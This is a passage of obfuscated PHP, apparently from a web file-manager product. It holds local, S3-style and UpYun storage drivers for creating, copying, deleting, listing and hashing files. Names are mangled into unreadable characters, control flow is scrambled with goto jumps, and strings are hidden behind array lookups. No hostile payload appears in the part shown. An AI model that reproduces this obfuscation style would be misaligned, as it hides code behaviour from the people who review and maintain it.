imagePNG($dîƒ‹©ÅÖí, $BÎ…¿Ì©Ë); break; default: break; } imageDestroy($dîƒ‹©ÅÖí); imageDestroy($this->im); goto D¹°‡õÁ™·; eùù…Ü‚†: if (!$this->im || $b‡òËåŠÉ % 360 === 0 || !function_exists($_SERVER[í…¶][1866])) { return !1; } $dîƒ‹©ÅÖí = imageRotate($this->im, 360 - $b‡òËåŠÉ, 0); $b÷•å£Šç = !1; goto b¢æ‡‹ÇŒº; Cëö‹í¯: } function echoImage($e¢¥ŞÊµŸ–, $fîêìºšŒº) { goto bóÇê˜İ­Û; bóÇê˜İ­Û: $C×†²öè– =& $_SERVER[í…¶]; if (!$e¢¥ŞÊµŸ–) { return !1; } ob_get_clean(); goto bî­óõ‚ã; bî­óõ‚ã: $EÚš½’Ñ¨¬ = !1; switch ($this->echoType) { case $C×†²öè–[1867]: $EÚš½’Ñ¨¬ = imagePNG($e¢¥ŞÊµŸ–); break; case $C×†²öè–[167]: $EÚš½’Ñ¨¬ = imagePNG($e¢¥ŞÊµŸ–, $fîêìºšŒº); break; } imageDestroy($e¢¥ŞÊµŸ–); goto EÅ‹™ŠµÒ¿; EÅ‹™ŠµÒ¿: imageDestroy($this->im); return $EÚš½’Ñ¨¬; goto f´Ú†…Ÿ; f´Ú†…Ÿ: } } goto b æßõÃ‹©; Döò˜Üİå¬: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($Dš…îğ°ó) { if (substr($Dš…îğ°ó, 0, 2) == $_SERVER[í…¶][1153]) { $Dš…îğ°ó = BASIC_PATH . substr($Dš…îğ°ó, 2); } return $Dš…îğ°ó; } public function iconvApp($eÅÚ„÷Õ™­) { $E¢–ÖÁµ…È =& $_SERVER[í…¶]; global $config; return $this->iconvTo($eÅÚ„÷Õ™­, $config[$E¢–ÖÁµ…È[1151]], $config[$E¢–ÖÁµ…È[1150]]); } public function iconvSystem($b¬Æ»ïõáÇ) { $Aóäø°ÉÙ =& $_SERVER[í…¶]; global $config; return $this->iconvTo($b¬Æ»ïõáÇ, $config[$Aóäø°ÉÙ[1150]], $config[$Aóäø°ÉÙ[1151]]); } public function getPathOuter($A²³˜‰å®) { goto D’ŞÚİÊ®; e¥É¤—Ò·¸: if (substr($c‘ÑøåÅÍ°, 0, 2) == $eš¿²ìå×Û[1153]) { $c‘ÑøåÅÍ° = BASIC_PATH . substr($c‘ÑøåÅÍ°, 2); } if (substr($A²³˜‰å®, 0, 2) == $eš¿²ìå×Û[1153]) { $A²³˜‰å® = BASIC_PATH . substr($A²³˜‰å®, 2); } $c‘ÑøåÅÍ° = KodIO::clear($c‘ÑøåÅÍ°); goto CªŒ…; D’ŞÚİÊ®: $eš¿²ìå×Û =& $_SERVER[í…¶]; $c‘ÑøåÅÍ° = $this->iconvApp($this->pathBase); $A²³˜‰å® = $this->iconvApp($A²³˜‰å®); goto e¥É¤—Ò·¸; CªŒ…: $A²³˜‰å® = KodIO::clear($A²³˜‰å®); $A²³˜‰å® = substr($A²³˜‰å®, strlen($c‘ÑøåÅÍ°)); if (empty($this->pathDriver)) { return $A²³˜‰å®; } goto E¾“»ÌŒ´è; E¾“»ÌŒ´è: return $this->pathDriver . $eš¿²ìå×Û[8] . ltrim($A²³˜‰å®, $eš¿²ìå×Û[8]); goto f—ÅÑ³¹©; f—ÅÑ³¹©: } public function mkfile($bÑ¿Š¹Ğ‰, $AéÀÃÜÛÍ» = '', $b‰ãšÉÁëÖ = REPEAT_RENAME) { $bÑ¿Š¹Ğ‰ = $this->iconvSystem($bÑ¿Š¹Ğ‰); @touch($bÑ¿Š¹Ğ‰); if ($AéÀÃÜÛÍ») { file_put_contents($bÑ¿Š¹Ğ‰, $AéÀÃÜÛÍ»); } return is_file($bÑ¿Š¹Ğ‰) ? $this->getPathOuter($bÑ¿Š¹Ğ‰) : !1; } public function mkdir($Dçì×®ßÚ, $fé¿„ğŠ¸ˆ = REPEAT_SKIP) { $Dçì×®ßÚ = $this->iconvSystem($Dçì×®ßÚ); if (is_dir($Dçì×®ßÚ)) { return $this->getPathOuter($Dçì×®ßÚ); } @mkdir($Dçì×®ßÚ, 511, !0); return is_dir($Dçì×®ßÚ) ? $this->getPathOuter($Dçì×®ßÚ) : !1; } public function copyFile($CŠã±Œäë, $c ë›¹Ğ) { $this->mkdir($this->pathFather($c ë›¹Ğ)); $CŠã±Œäë = $this->iconvSystem($CŠã±Œäë); $c ë›¹Ğ = $this->iconvSystem($c ë›¹Ğ); $eÙæ¥«Í³² = @copy($CŠã±Œäë, $c ë›¹Ğ); return $eÙæ¥«Í³² ? $this->getPathOuter($c ë›¹Ğ) : !1; } public function moveFile($a¥Ùï—¡Â‚, $f¿Î¸Ğ™) { $this->mkdir($this->pathFather($f¿Î¸Ğ™)); $a¥Ùï—¡Â‚ = $this->iconvSystem($a¥Ùï—¡Â‚); $f¿Î¸Ğ™ = $this->iconvSystem($f¿Î¸Ğ™); $Açã²¬‹Ü° = intval(@rename($a¥Ùï—¡Â‚, $f¿Î¸Ğ™)); if (!$Açã²¬‹Ü°) { if ($Açã²¬‹Ü° = intval(@copy($a¥Ùï—¡Â‚, $f¿Î¸Ğ™))) { @unlink($a¥Ùï—¡Â‚); } } return $Açã²¬‹Ü° ? $this->getPathOuter($f¿Î¸Ğ™) : !1; } public function delFile($dÒÁñº¡‰À) { $dÒÁñº¡‰À = $this->iconvSystem($dÒÁñº¡‰À); if (!@unlink($dÒÁñº¡‰À)) { @chmod($dÒÁñº¡‰À, 511); if (!@unlink($dÒÁñº¡‰À)) { return !1; } } else { return !0; } } public function delFolder($DÆÅ¡Î‹Ü°) { goto C¬‹šÁéùø; bÙííë÷â: return rmdir($DÆÅ¡Î‹Ü°); goto e„†É¼’«ƒ; a¥¿Ô²¦›: if (!($Fª‡ÂÌƒØ— = opendir($DÆÅ¡Î‹Ü°))) { return !1; } while (($DÄÚ¢Õ–âß = readdir($Fª‡ÂÌƒØ—)) !== !1) { if ($DÄÚ¢Õ–âß == $D»§Ó„Á½‘[91] || $DÄÚ¢Õ–âß == $D»§Ó„Á½‘[1163]) { continue; } $Cäô›–²‘’ = $DÆÅ¡Î‹Ü° . $D»§Ó„Á½‘[8] . $DÄÚ¢Õ–âß; if (is_file($Cäô›–²‘’) || is_link($Cäô›–²‘’)) { if (!unlink($Cäô›–²‘’)) { chmod($Cäô›–²‘’, 511); if (!unlink($Cäô›–²‘’)) { return !1; } } } else { if (is_dir($Cäô›–²‘’)) { chmod($Cäô›–²‘’, 511); $Cäô›–²‘’ = $this->iconvApp($Cäô›–²‘’); if (!$this->delFolder($Cäô›–²‘’)) { return !1; } } } } closedir($Fª‡ÂÌƒØ—); goto bÙííë÷â; C¬‹šÁéùø: $D»§Ó„Á½‘ =& $_SERVER[í…¶]; $DÆÅ¡Î‹Ü° = $this->iconvSystem($DÆÅ¡Î‹Ü°); if (!is_dir($DÆÅ¡Î‹Ü°)) { return !0; } goto a¥¿Ô²¦›; e„†É¼’«ƒ: } public function rename($dÃÂ²ôÚÓÇ, $cì™ä†ŞÙ) { goto Bå¥ÙÀ†ñÊ; aØîÓ…Î¤: $AêÜÖÍÀÏå = @rename($dÃÂ²ôÚÓÇ, $Aø­×«¦á‹); $Aø­×«¦á‹ = $this->iconvApp($Aø­×«¦á‹); return $AêÜÖÍÀÏå ? $this->getPathOuter($Aø­×«¦á‹) : !1; goto fÉÍŠø’¿¾; Bå¥ÙÀ†ñÊ: $Dì™êÁÅ¢ =& $_SERVER[í…¶]; $fÀ¡áÄµœ = $this->fileNameAuto($this->pathFather($dÃÂ²ôÚÓÇ), $cì™ä†ŞÙ); $fÀ¡áÄµœ = $this->iconvSystem($fÀ¡áÄµœ); goto CÈË½òŠïÌ; CÈË½òŠïÌ: $dÃÂ²ôÚÓÇ = $this->iconvSystem($dÃÂ²ôÚÓÇ); $CÈ†ù·Øˆ = $this->pathFather($dÃÂ²ôÚÓÇ); $Aø­×«¦á‹ = rtrim($CÈ†ù·Øˆ, $Dì™êÁÅ¢[8]) . $Dì™êÁÅ¢[8] . $fÀ¡áÄµœ; goto aØîÓ…Î¤; fÉÍŠø’¿¾: } public function size($d›ß®‡çô„) { $d›ß®‡çô„ = $this->iconvSystem($d›ß®‡çô„); return (double) abs(sprintf($_SERVER[í…¶][1165], @filesize($d›ß®‡çô„))); } public function info($D¢¡™¾­šß) { $D¢¡™¾­šß = $this->iconvSystem($D¢¡™¾­šß); if ($this->isFolder($D¢¡™¾­šß)) { return $this->folderInfo($D¢¡™¾­šß); } else { if ($this->isFile($D¢¡™¾­šß)) { return $this->fileInfo($D¢¡™¾­šß); } } return !1; } protected function infoChildren($aš„È“½Ç¸, &$fÈ¤ËÆÙ¯Ì, $DÑÚ³ÙçƒÑ = true) { goto BêÜ‹ò‹ä”; d†Äîé¿°: if ($DÑÚ³ÙçƒÑ) { $aš„È“½Ç¸ = $this->iconvSystem($aš„È“½Ç¸); } if (!($aÅŠö®¬ÊÖ = @opendir($aš„È“½Ç¸))) { return; } while (($D¾“–‹Ã³ = readdir($aÅŠö®¬ÊÖ)) !== !1) { if ($D¾“–‹Ã³ == $eœÒÌ‡‹‚Á[91] || $D¾“–‹Ã³ == $eœÒÌ‡‹‚Á[1163]) { continue; } $aØ³ò«”££ = $aš„È“½Ç¸ . $D¾“–‹Ã³; if (is_file($aØ³ò«”££) || is_link($aØ³ò«”££)) { $fÈ¤ËÆÙ¯Ì[$eœÒÌ‡‹‚Á[78]]++; $fÈ¤ËÆÙ¯Ì[$eœÒÌ‡‹‚Á[77]] += (double) abs(sprintf($eœÒÌ‡‹‚Á[1165], @filesize($aØ³ò«”££))); } else { if (is_dir($aØ³ò«”££)) { $fÈ¤ËÆÙ¯Ì[$eœÒÌ‡‹‚Á[79]]++; $this->infoChildren($aØ³ò«”££, $fÈ¤ËÆÙ¯Ì, !1); } } } goto CñÖ¬Ó­˜À; CñÖ¬Ó­˜À: closedir($aÅŠö®¬ÊÖ); goto FŒ‚¬İ¦ò·; BêÜ‹ò‹ä”: $eœÒÌ‡‹‚Á =& $_SERVER[í…¶]; check_abort(); $aš„È“½Ç¸ = rtrim($aš„È“½Ç¸, $eœÒÌ‡‹‚Á[8]) . $eœÒÌ‡‹‚Á[8]; goto d†Äîé¿°; FŒ‚¬İ¦ò·: } private function folderInfo($cËÙËÚôÔ, $cƒ‹Å£¾´à = false) { $f¡ÆŒª·¾ =& $_SERVER[í…¶]; $cËÙËÚôÔ = rtrim($cËÙËÚôÔ, $f¡ÆŒª·¾[8]) . $f¡ÆŒª·¾[8]; $E„¿¼ê´èÏ = $this->iconvApp($this->pathThis($cËÙËÚôÔ)); if ($cƒ‹Å£¾´à) { return array($f¡ÆŒª·¾[28] => $E„¿¼ê´èÏ, $f¡ÆŒª·¾[75] => $this->getPathOuter($cËÙËÚôÔ), $f¡ÆŒª·¾[29] => $f¡ÆŒª·¾[76]); } $e¶ŒÃÍ¿¿ = array($f¡ÆŒª·¾[28] => $E„¿¼ê´èÏ, $f¡ÆŒª·¾[75] => $this->getPathOuter($cËÙËÚôÔ), $f¡ÆŒª·¾[29] => $f¡ÆŒª·¾[76], $f¡ÆŒª·¾[187] => @filectime($cËÙËÚôÔ), $f¡ÆŒª·¾[107] => @filemtime($cËÙËÚôÔ), $f¡ÆŒª·¾[1166] => @fileatime($cËÙËÚôÔ), $f¡ÆŒª·¾[1160] => is_readable($cËÙËÚôÔ), $f¡ÆŒª·¾[1161] => is_writable($cËÙËÚôÔ), $f¡ÆŒª·¾[1167] => get_mode($cËÙËÚôÔ)); return $e¶ŒÃÍ¿¿; } private function fileInfo($b¹Œ’‡¾íÒ, $Fô÷è·Û’— = false) { $fÒ‰…ùæñÓ =& $_SERVER[í…¶]; $BÇİ˜á¼¯ = $this->iconvApp($this->pathThis($b¹Œ’‡¾íÒ)); if ($Fô÷è·Û’—) { return array($fÒ‰…ùæñÓ[28] => $BÇİ˜á¼¯, $fÒ‰…ùæñÓ[75] => $this->getPathOuter($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[29] => $fÒ‰…ùæñÓ[167], $fÒ‰…ùæñÓ[77] => $this->size($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[160] => $this->ext($BÇİ˜á¼¯)); } $BÈñ¯ŒÀõÙ = array($fÒ‰…ùæñÓ[28] => $BÇİ˜á¼¯, $fÒ‰…ùæñÓ[75] => $this->getPathOuter($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[29] => $fÒ‰…ùæñÓ[167], $fÒ‰…ùæñÓ[187] => @filectime($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[107] => @filemtime($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[1166] => @fileatime($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[77] => $this->size($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[160] => $this->ext($BÇİ˜á¼¯), $fÒ‰…ùæñÓ[1160] => is_readable($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[1161] => is_writable($b¹Œ’‡¾íÒ), $fÒ‰…ùæñÓ[1167] => get_mode($b¹Œ’‡¾íÒ)); return $BÈñ¯ŒÀõÙ; } public function exist($b¨‹Æ’èª¹) { $b¨‹Æ’èª¹ = $this->iconvSystem($b¨‹Æ’èª¹); return @file_exists($b¨‹Æ’èª¹); } public function isFile($BÖ»…ˆÊ²¤) { $BÖ»…ˆÊ²¤ = $this->iconvSystem($BÖ»…ˆÊ²¤); return @is_file($BÖ»…ˆÊ²¤); } public function isFolder($D‘­É â‡²) { $D‘­É â‡² = $this->iconvSystem($D‘­É â‡²); return @is_dir($D‘­É â‡²); } public function listPath($E‘¯ºøº¢å, $AºóĞœŠˆ = false) { goto C¼Ì¿ÎàÙ; f´˜ƒÊØÂä: $Cº‚šÁ¸Íè = array($EŞá¸™ù³¥[74] => array(), $EŞá¸™ù³¥[73] => array()); if (!($dè”­‡±¢ = @opendir($E‘¯ºøº¢å))) { return $Cº‚šÁ¸Íè; } while (($a××¹ÍŠÀ = readdir($dè”­‡±¢)) !== !1) { if ($a××¹ÍŠÀ == $EŞá¸™ù³¥[91] || $a××¹ÍŠÀ == $EŞá¸™ù³¥[1163]) { continue; } $Dãè×õÏÄÙ = $E‘¯ºøº¢å . $a××¹ÍŠÀ; if (is_file($Dãè×õÏÄÙ)) { $Cº‚šÁ¸Íè[$EŞá¸™ù³¥[73]][] = $this->fileInfo($Dãè×õÏÄÙ, $AºóĞœŠˆ); } else { $Cº‚šÁ¸Íè[$EŞá¸™ù³¥[74]][] = $this->folderInfo($Dãè×õÏÄÙ, $AºóĞœŠˆ); } } goto f½ƒ‰Ÿ’Â; f½ƒ‰Ÿ’Â: closedir($dè”­‡±¢); return $Cº‚šÁ¸Íè; goto b÷ˆİ¢•îê; C¼Ì¿ÎàÙ: $EŞá¸™ù³¥ =& $_SERVER[í…¶]; $E‘¯ºøº¢å = $this->iconvSystem($E‘¯ºøº¢å); $E‘¯ºøº¢å = rtrim($E‘¯ºøº¢å, $EŞá¸™ù³¥[8]) . $EŞá¸™ù³¥[8]; goto f´˜ƒÊØÂä; b÷ˆİ¢•îê: } public function listAll($A›Ì´£´•Ÿ, &$cêßÏ°Åª‚ = array()) { goto C‚Î–§ù¤Ë; F¬Ë¼´†…¸: if (!($Cçå¸ôùí = @opendir($A›Ì´£´•Ÿ))) { return $cêßÏ°Åª‚; } while (($F‡ÆÄ³ªİ = readdir($Cçå¸ôùí)) !== !1) { if ($F‡ÆÄ³ªİ == $E®˜ÖËİ•Æ[91] || $F‡ÆÄ³ªİ == $E®˜ÖËİ•Æ[1163]) { continue; } $DÉìÄ„¬‡ = $A›Ì´£´•Ÿ . $F‡ÆÄ³ªİ; if (is_dir($DÉìÄ„¬‡) && !is_link($DÉìÄ„¬‡)) { $cêßÏ°Åª‚[] = array($E®˜ÖËİ•Æ[75] => $DÉìÄ„¬‡ . $E®˜ÖËİ•Æ[8], $E®˜ÖËİ•Æ[76] => 1, $E®˜ÖËİ•Æ[107] => @filemtime($DÉìÄ„¬‡), $E®˜ÖËİ•Æ[77] => 0); $this->listAll($DÉìÄ„¬‡, $cêßÏ°Åª‚); } else { $cêßÏ°Åª‚[] = array($E®˜ÖËİ•Æ[75] => $DÉìÄ„¬‡, $E®˜ÖËİ•Æ[76] => 0, $E®˜ÖËİ•Æ[107] => @filemtime($DÉìÄ„¬‡), $E®˜ÖËİ•Æ[77] => $this->size($DÉìÄ„¬‡)); } } closedir($Cçå¸ôùí); goto fÍ˜Öù²Œí; C‚Î–§ù¤Ë: $E®˜ÖËİ•Æ =& $_SERVER[í…¶]; $A›Ì´£´•Ÿ = $this->iconvSystem($A›Ì´£´•Ÿ); $A›Ì´£´•Ÿ = rtrim($A›Ì´£´•Ÿ, $E®˜ÖËİ•Æ[8]) . $E®˜ÖËİ•Æ[8]; goto F¬Ë¼´†…¸; fÍ˜Öù²Œí: return $cêßÏ°Åª‚; goto e±¨éÓ±«í; e±¨éÓ±«í: } public function has($CêˆÜˆƒ‡“, $eÉŠ¶†¸ğ = false, $aŠí³èå‡ = true) { goto C¹½Î‘Î÷; C¹½Î‘Î÷: $d¼ÒÜÃ¬® =& $_SERVER[í…¶]; $CêˆÜˆƒ‡“ = $this->iconvSystem($CêˆÜˆƒ‡“); $CêˆÜˆƒ‡“ = rtrim($CêˆÜˆƒ‡“, $d¼ÒÜÃ¬®[8]) . $d¼ÒÜÃ¬®[8]; goto c£àÃ’É÷µ; AœÍéÉÂ‡: $A¶…ÆÔîÏ = 0; while (($A¹¹Ø›áÚÓ = readdir($EîÓÅëÔ±Š)) !== !1) { if ($A¹¹Ø›áÚÓ == $d¼ÒÜÃ¬®[91] || $A¹¹Ø›áÚÓ == $d¼ÒÜÃ¬®[1163]) { continue; } $AÑ¼á‘ª÷ = $CêˆÜˆƒ‡“ . $A¹¹Ø›áÚÓ; if ($eÉŠ¶†¸ğ) { $A¶…ÆÔîÏ++; if (@is_file($AÑ¼á‘ª÷)) { $B˜©©ãò¸Ó++; } else { $e¶¹ï„óÀÔ++; } if ($A¶…ÆÔîÏ > 10000) { break; } continue; } if ($aŠí³èå‡) { if (@is_file($AÑ¼á‘ª÷)) { return !0; } } else { if (@is_dir($AÑ¼á‘ª÷ . $d¼ÒÜÃ¬®[8])) { return !0; } } } closedir($EîÓÅëÔ±Š); goto däƒªšÕïŠ; däƒªšÕïŠ: if ($eÉŠ¶†¸ğ) { return array($d¼ÒÜÃ¬®[191] => $B˜©©ãò¸Ó, $d¼ÒÜÃ¬®[192] => $e¶¹ï„óÀÔ); } return !1; goto f„×ÎŠ¥çÚ; c£àÃ’É÷µ: if (!($EîÓÅëÔ±Š = @opendir($CêˆÜˆƒ‡“))) { return !1; } $B˜©©ãò¸Ó = 0; $e¶¹ï„óÀÔ = 0; goto AœÍéÉÂ‡; f„×ÎŠ¥çÚ: } public function hashSimple($E„À¬åí‘ğ) { goto Eò‰ğƒ¸Óæ; fÏØôÔ¢º»: if ($Fˆ¾£æèÓ× <= $fÇ×„‘Ç… * $D’Û›ƒ¥) { return $this->hashMd5($E„À¬åí‘ğ) . $Fˆ¾£æèÓ×; } $AŒß§©Ï‡ = $Få¢éğÀ[33]; $dÏä™ ‡ºƒ = intval($Fˆ¾£æèÓ× / $D’Û›ƒ¥); goto D†‹ö¢²£; Fà—¼µÈ‚¢: fseek($bñóğÁ¤¹, $Fˆ¾£æèÓ× - $fÇ×„‘Ç…); $AŒß§©Ï‡ .= fread($bñóğÁ¤¹, $fÇ×„‘Ç…); fclose($bñóğÁ¤¹); goto Aå°ŒĞ®°Í; Eò‰ğƒ¸Óæ: $Få¢éğÀ =& $_SERVER[í…¶]; if (!$E„À¬åí‘ğ) { return md5($Få¢éğÀ[33]); } $E„À¬åí‘ğ = $this->iconvSystem($E„À¬åí‘ğ); goto F†Á¯‡÷¤è; D†‹ö¢²£: $bñóğÁ¤¹ = fopen($E„À¬åí‘ğ, $Få¢éğÀ[1168]); if (!$bñóğÁ¤¹) { return $AŒß§©Ï‡; } for ($bê«À•¼ = 0; $bê«À•¼ < $D’Û›ƒ¥; $bê«À•¼++) { fseek($bñóğÁ¤¹, $dÏä™ ‡ºƒ * $bê«À•¼); $AŒß§©Ï‡ .= fread($bñóğÁ¤¹, $fÇ×„‘Ç…); } goto Fà—¼µÈ‚¢; Aå°ŒĞ®°Í: return md5($AŒß§©Ï‡) . $Fˆ¾£æèÓ×; goto A‘°÷Ö¸·Œ; F†Á¯‡÷¤è: $Fˆ¾£æèÓ× = $this->size($E„À¬åí‘ğ); $fÇ×„‘Ç… = 200; $D’Û›ƒ¥ = 50; goto fÏØôÔ¢º»; A‘°÷Ö¸·Œ: } public function getContent($b£×‰‡Æèó) { $b£×‰‡Æèó = $this->iconvSystem($b£×‰‡Æèó); return file_get_contents($b£×‰‡Æèó); } public function setContent($DÅĞ‘“ÍŠ‚, $eÆÇôÌ¢» = '') { $DÅĞ‘“ÍŠ‚ = $this->iconvSystem($DÅĞ‘“ÍŠ‚); @file_put_contents($DÅĞ‘“ÍŠ‚, $eÆÇôÌ¢», LOCK_EX); clearstatcache(); return strlen($eÆÇôÌ¢») == filesize($DÅĞ‘“ÍŠ‚); } public function fileSubstr($dñ°ºİË¡, $D‹ù†˜¨ó½ = 0, $CäšíÔÕİ‹ = false) { goto E‰ËÄ–ïÉ©; E‰ËÄ–ïÉ©: $bÕæ±Œ˜Éä =& $_SERVER[í…¶]; $dñ°ºİË¡ = $this->iconvSystem($dñ°ºİË¡); if ($CäšíÔÕİ‹ === !1) { $CäšíÔÕİ‹ = $this->size($dñ°ºİË¡); } goto AÁÀñ”£†; eÀØÊï¤–Ô: return $D¬©•ÍÀ; goto aóÚÊºš‹İ; AÁÀñ”£†: if ($CäšíÔÕİ‹ <= 0) { return $bÕæ±Œ˜Éä[33]; } $bÍÁŠØƒ = fopen($dñ°ºİË¡, $bÕæ±Œ˜Éä[1168]); if (!$bÍÁŠØƒ) { return !1; } goto BŞßÄíºÇÛ; BŞßÄíºÇÛ: fseek($bÍÁŠØƒ, $D‹ù†˜¨ó½); $D¬©•ÍÀ = fread($bÍÁŠØƒ, $CäšíÔÕİ‹); fclose($bÍÁŠØƒ); goto eÀØÊï¤–Ô; aóÚÊºš‹İ: } public function upload($E…Ï¥Ü¦ù„, $fÇ¸¤ê“À, $fÁÒ…éÅáÔ = false, $Cù£ĞëÂßµ = REPEAT_REPLACE) { $e¤İ…×´¢Ñ = $this->copyFile($fÇ¸¤ê“À, $E…Ï¥Ü¦ù„); return $e¤İ…×´¢Ñ ? $this->getPathOuter($E…Ï¥Ü¦ù„) : !1; } public function setModifyTime($Aïİ§ÍÀÑ, $fØÄÉãó³ = '') { @touch($Aïİ§ÍÀÑ, intval($fØÄÉãó³)); } public function download($cà…éÛ…åÕ, $cìÕ¶ß°ÔÌ) { return $this->iconvSystem($cà…éÛ…åÕ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($e´ÇÊ‡–â) { parent::__construct($e´ÇÊ‡–â); $this->signatureVersion($_SERVER[í…¶][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Bæº£±š³ƒ) { parent::__construct($Bæº£±š³ƒ); $this->signatureVersion($_SERVER[í…¶][200]); } public function fileOutLink($d°ˆè¶á) { $A¿š† õÂ =& $_SERVER[í…¶]; if (substr($d°ˆè¶á, 0, 7) == $A¿š† õÂ[1113]) { $d°ˆè¶á = $A¿š† õÂ[1114] . substr($d°ˆè¶á, 7); } header($A¿š† õÂ[156] . $d°ˆè¶á); die; } } goto a‡ÙæâÖ¬§; CÏÖô„ƒ›µ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($E‰èä¡É‘Ê, $D”Î×óˆ¡Á = 0) { parent::__construct(); $this->source = $E‰èä¡É‘Ê; $this->sourceSize = $D”Î×óˆ¡Á; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($CåÏÙè‘„Œ = false) { return $this->sourceSize; } public function getContent($AÎêË¡ÚÔÚ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Fî˜í«ã£à = ftell($this->source); $bÄËğšŞæ‚ = @fread($this->source, $this->sourceSize); fseek($this->source, $Fî˜í«ã£à); return $bÄËğšŞæ‚; } } public function fileSubstr($f ïã¸–Ê = false, $DÍæÒ±’ˆ = 0, $a°¹ÎÙ¼¾ = 0) { if (!$a°¹ÎÙ¼¾) { $a°¹ÎÙ¼¾ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $DÍæÒ±’ˆ, $a°¹ÎÙ¼¾); } if ($this->sourceType == self::TYPE_FILE) { $a›Õì™‹ƒ = ftell($this->source); fseek($this->source, $a›Õì™‹ƒ + $DÍæÒ±’ˆ); $CÆàì¦±Ù” = @fread($this->source, $a°¹ÎÙ¼¾); fseek($this->source, $a›Õì™‹ƒ); return $CÆàì¦±Ù”; } } public function hashMd5($aˆ˜­Õµªï = false) { return md5($this->getContent()); } public static function hash($c¹È»‡á ‹, $b—ßœÁÃé = 0) { $aÖã­°É†õ = new PathDriverStream($c¹È»‡á ‹, $b—ßœÁÃé); return $aÖã­°É†õ->hashSimple($c¹È»‡á ‹); } public static function md5($E‘Ô”ø‹‰ö, $F¬ áæŞ¼Ù = 0) { $d«–—¿ïÏŒ = new PathDriverStream($E‘Ô”ø‹‰ö, $F¬ áæŞ¼Ù); return $d«–—¿ïÏŒ->hashMd5($E‘Ô”ø‹‰ö); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\57\x76\60\x2e\141\x70\151\x2e\165\x70\x79\x75\x6e\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Eê¢°›Á) { parent::__construct(); $this->_init($Eê¢°›Á); } public function _init($cÇ¬Ó—Í·) { foreach ($cÇ¬Ó—Í· as $c’¥‰¼ÕÌ => $E‚¸¶¯µ Š) { if (isset($this->{$c’¥‰¼ÕÌ})) { $this->{$c’¥‰¼ÕÌ} = $E‚¸¶¯µ Š; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[í…¶][1239], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($b÷À’œË‘ö, $aªÂìšæ¡ = "\107\x45\x54") { $EŸœíÖ®Û =& $_SERVER[í…¶]; $a›ªÆßœÃœ = gmdate($EŸœíÖ®Û[1203]); $a…ƒ¿¨Ÿõ¹ = base64_encode(hash_hmac($EŸœíÖ®Û[1240], "{$aªÂìšæ¡}\46{$b÷À’œË‘ö}\x26{$a›ªÆßœÃœ}", md5("{$this->userpass}"), !0)); $E«ù¥–®Ó¬ = array("\x41\x75\x74\150\x6f\x72\151\172\141\164\x69\x6f\156\x3a\125\120\x59\125\116\40{$this->username}\72{$a…ƒ¿¨Ÿõ¹}", "\x44\141\164\145\72{$a›ªÆßœÃœ}"); return $E«ù¥–®Ó¬; } public function ussRequest($F®œŠÁ‚—Ù, $Då¤ÚØ¶½‘ = "\107\x45\x54", $b¹™å‚«ˆù = false, $cÌø©Ê—Ñ  = false, $Bæ°Ø‰«œ½ = false) { goto eØ‚ãÉÜ”Ù; bª¹à®™¬Æ: if (!$e”Ñ—Û…æ) { return array($B›˜–ÂñäÅ[1030] => !1, $B›˜–ÂñäÅ[1032] => $B›˜–ÂñäÅ[1241]); } if (strtolower($Då¤ÚØ¶½‘) == $B›˜–ÂñäÅ[184] || in_array($e”Ñ—Û…æ[$B›˜–ÂñäÅ[1030]], array($B›˜–ÂñäÅ[1098], $B›˜–ÂñäÅ[1242]))) { $b¹™å‚«ˆù = $e”Ñ—Û…æ[$B›˜–ÂñäÅ[1243]]; } else { $b¹™å‚«ˆù = json_decode($e”Ñ—Û…æ[$B›˜–ÂñäÅ[1032]], !0); if (!$b¹™å‚«ˆù) { $b¹™å‚«ˆù = $e”Ñ—Û…æ[$B›˜–ÂñäÅ[1032]]; } else { if (!$e”Ñ—Û…æ[$B›˜–ÂñäÅ[691]] && isset($b¹™å‚«ˆù[$B›˜–ÂñäÅ[1244]])) { $b¹™å‚«ˆù = $b¹™å‚«ˆù[$B›˜–ÂñäÅ[1244]]; } } } return array($B›˜–ÂñäÅ[1030] => $e”Ñ—Û…æ[$B›˜–ÂñäÅ[691]], $B›˜–ÂñäÅ[1032] => $b¹™å‚«ˆù); goto a–Š¶–æ•°; eØ‚ãÉÜ”Ù: $B›˜–ÂñäÅ =& $_SERVER[í…¶]; $F®œŠÁ‚—Ù = trim($F®œŠÁ‚—Ù, $B›˜–ÂñäÅ[8]); $f“èĞ³‚× = "\57{$this->bucket}\x2f{$F®œŠÁ‚—Ù}"; goto a¦–Ğ¿êØ; a¦–Ğ¿êØ: $fõ•Û­îé = $this->ussHeaders($f“èĞ³‚×, $Då¤ÚØ¶½‘); if ($cÌø©Ê—Ñ ) { $fõ•Û­îé = array_merge($fõ•Û­îé, $cÌø©Ê—Ñ ); } $e”Ñ—Û…æ = url_request($this->endpoint . $f“èĞ³‚×, $Då¤ÚØ¶½‘, $b¹™å‚«ˆù, $fõ•Û­îé, $Bæ°Ø‰«œ½); goto bª¹à®™¬Æ; a–Š¶–æ•°: } public function mkfile($aÉÉÚœ™®†, 